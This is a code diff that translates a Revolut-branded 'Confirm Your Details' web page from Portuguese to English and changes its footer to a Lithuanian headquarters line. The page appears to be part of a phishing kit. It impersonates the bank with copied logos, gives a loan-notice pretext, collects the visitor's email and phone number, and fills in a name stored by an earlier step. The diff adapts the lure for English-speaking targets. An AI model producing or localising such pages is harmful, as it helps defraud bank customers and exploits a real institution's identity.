@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-PT">
+<html lang="en">
 <head>
 <script>
 (function(){
@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1"/>
-<title>Confirme os seus Dados — RevolutBank</title>
+<title>Confirm Your Details — RevolutBank</title>
 <link rel="icon" href="images/revolut-favicon.svg"/>
 <style>
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
@@ -116,7 +116,7 @@
     <div class="brand"><img src="images/revolut-logo.png" alt="RevolutBank" style="height:28px;width:auto;display:block;"/></div>
     <div class="user-block">
       <div class="user-info">
-        <div class="name" id="userName">cliente</div>
+        <div class="name" id="userName">customer</div>
         <div class="nif" id="userNif">*** *** ***</div>
       </div>
       <div class="avatar"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M16 14a4 4 0 10-8 0M12 12a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" stroke-linejoin="round"/><path d="M4 21c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
@@ -124,20 +124,20 @@
   </div>
 
   <div class="card">
-    <h1>Confirme os seus Dados de contacto</h1>
-    <div class="lead">Para receber os avisos de pagamento e atualizações sobre o seu empréstimo</div>
+    <h1>Confirm Your Contact Details</h1>
+    <div class="lead">To receive payment notices and updates about your loan</div>
 
     <div class="info-box">
       <div class="info-icon">
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </div>
       <div>
-        <div class="info-title">Irá receber:</div>
+        <div class="info-title">You will receive:</div>
         <ul class="info-list">
-          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Avisos de pagamento por e-mail</li>
-          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Avisos de vencimento por SMS</li>
-          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Atualizações sobre o seu contrato</li>
-          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Comprovativos de pagamento</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Payment notices by email</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Due date reminders by SMS</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Updates about your contract</li>
+          <li><span class="check"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Payment receipts</li>
         </ul>
       </div>
     </div>
@@ -146,30 +146,30 @@
       <div class="form-group">
         <label class="form-label" for="emailInput">
           <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          E-mail <span class="required">*</span>
+          Email <span class="required">*</span>
         </label>
         <div class="input-wrap">
-          <input autocomplete="email" class="form-input" id="emailInput" placeholder="seu@email.com" required="" type="email"/>
+          <input autocomplete="email" class="form-input" id="emailInput" placeholder="your@email.com" required="" type="email"/>
           <svg class="input-icon" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
         </div>
-        <div class="error-msg" id="emailError">Por favor, insira um e-mail válido</div>
+        <div class="error-msg" id="emailError">Please enter a valid email address</div>
       </div>
 
       <div class="form-group">
         <label class="form-label" for="phoneInput">
           <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          Telemóvel <span class="required">*</span>
+          Mobile Phone <span class="required">*</span>
         </label>
         <div class="phone-row">
           <div class="phone-prefix"><span class="flag"></span> +351</div>
           <input autocomplete="tel" class="form-input" id="phoneInput" maxlength="15" placeholder="911 181 188" required="" type="tel"/>
         </div>
-        <div class="error-msg" id="phoneError">Por favor, insira um telemóvel válido</div>
+        <div class="error-msg" id="phoneError">Please enter a valid phone number</div>
       </div>
 
       <button class="btn-submit" id="submitBtn" type="submit">
         <svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Confirmar e Continuar
+        Confirm and Continue
       </button>
     </form>
   </div>
@@ -177,22 +177,22 @@
   <div class="footer">
     <div class="l"><img src="images/revolut-logo.png" alt="RevolutBank" style="height:32px;width:auto;display:block;margin:0 auto 6px;"/></div>
     <div>RevolutBank</div>
-    <div>Sucursal em Portugal — Lisboa — 1050-001</div>
+    <div>Revolut Bank UAB — Headquartered in Lithuania</div>
   </div>
 </div>
 
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loading-box">
     <div class="spinner"></div>
-    <div class="text">A guardar os seus dados...</div>
+    <div class="text">Saving your details...</div>
   </div>
 </div>
 
 <script>
 (function(){
-  var nome = (localStorage.getItem('nome')||'cliente').trim();
+  var nome = (localStorage.getItem('nome')||'customer').trim();
   var p = nome.split(/\s+/).filter(Boolean);
-  var primeiro = p[0] || 'cliente';
+  var primeiro = p[0] || 'customer';
   var ultimo = p.length > 1 ? p.slice(-1)[0] : '';
   var exibicao = (primeiro + ' ' + ultimo).trim().toLowerCase();
   document.getElementById('userName').textContent = exibicao;
